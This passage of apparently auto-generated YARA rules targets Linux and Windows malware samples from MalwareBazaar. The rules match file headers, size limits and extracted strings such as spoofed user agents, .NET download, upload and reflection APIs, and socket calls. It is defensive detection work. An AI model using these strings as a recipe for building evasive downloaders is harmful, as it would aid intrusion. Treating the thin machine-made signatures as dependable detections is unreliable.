        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB and
        all of them
}

rule Linux_8e160bb2b1c1d64a5017c752bc1ec64aa7651d0f3bca50f6561af5ba6e8e7a90
{
    meta:
        description = "Auto ML: 8e160bb2b1c1d64a5017c752bc1ec64aa7651d0f3bca50f6561af5ba6e8e7a90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Sd2C"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB and
        all of them
}

rule Windows_8e335f903d86e447fb05936d26290e5d7ee0250eef7bc7b1129c0a017db6c538
{
    meta:
        description = "Auto ML: 8e335f903d86e447fb05936d26290e5d7ee0250eef7bc7b1129c0a017db6c538"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Load"
        $s5 = "DownloadData"
        $s6 = "GetTypeFromHandle"
        $s7 = "GetExportedTypes"
        $s8 = "CreateDelegate"
        $s9 = "WriteLine"
        $s10 = "Kozlhtg2.exe"
        $s11 = "<Module>"
        $s12 = "FirstProcessor"
        $s13 = "SecondProcessor"
        $s14 = "ThirdProcessor"
        $s15 = "System.Collections.Generic"
        $s16 = "System.Linq"
        $s17 = "System.Reflection"
        $s18 = "System.IO"
        $s19 = "StreamWriter"
        $s20 = "System.Net"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11KB and
        all of them
}

rule Windows_8e411fc8f14e13529b159a569f7da3298244a9d012bef0821748b193abf9dec2
{
    meta:
        description = "Auto ML: 8e411fc8f14e13529b159a569f7da3298244a9d012bef0821748b193abf9dec2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadOnlyCollection`1"
        $s5 = "kernel32"
        $s6 = "Microsoft.Win32"
        $s7 = "WriteInt32"
        $s8 = "<Module>"
        $s9 = "CreateDC"
        $s10 = "DeleteDC"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "CreateFileTransactedW"
        $s14 = "CreateFileW"
        $s15 = "GetFileAttributesW"
        $s16 = "GetFileAttributesExW"
        $s17 = "UploadData"
        $s18 = "set_Verb"
        $s19 = "GetHdc"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 939KB and
        all of them
}

rule Windows_8e45c8a0057c86bf0279d9c7173a2a7edc397ada2a72494692646e2ab84c49e5
{
    meta:
        description = "Auto ML: 8e45c8a0057c86bf0279d9c7173a2a7edc397ada2a72494692646e2ab84c49e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = ".reloc"
        $s4 = "`.reloc"
        $s5 = "`.text"
        $s6 = "@.text"
        $s7 = "@.rdata"
        $s8 = "of Internet users sending X.509 standard encrypted information. They also can be used to digitally sign"
        $s9 = "WSAGetLastError"
        $s10 = "__WSAFDIsSet"
        $s11 = "closesocket"
        $s12 = "connect"
        $s13 = "gethostbyname"
        $s14 = "ioctlsocket"
        $s15 = "socket"
        $s16 = "CoCreateInstance"
        $s17 = "DeleteUrlCacheEntry"
        $s18 = "ExitProcess"
        $s19 = "ExitThread"
        $s20 = "FileTimeToLocalFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 234KB and
        all of them
}

rule Windows_8eb79a0dd9103b2bddd05ae7227845650edeb0ed22722f6a62798cdbc18873a8
{
    meta:
        description = "Auto ML: 8eb79a0dd9103b2bddd05ae7227845650edeb0ed22722f6a62798cdbc18873a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Ypnxsvsec.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "WriterSingletonContainer"
        $s8 = "RegistryWriterPool"
        $s9 = "<Module>{91df37d9-f7a4-4dfa-833d-3ee017d142d5}"
        $s10 = "SetToken"
        $s11 = "System.Reflection"
        $s12 = "System.Reflection.Emit"
        $s13 = "GetMethod"
        $s14 = "DefineDynamicModule"
        $s15 = "ModuleBuilder"
        $s16 = "GetTypeFromHandle"
        $s17 = "System.Linq"
        $s18 = "System.Core"
        $s19 = "System.Collections.Generic"
        $s20 = "ConnectToken"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 88KB and
        all of them
}
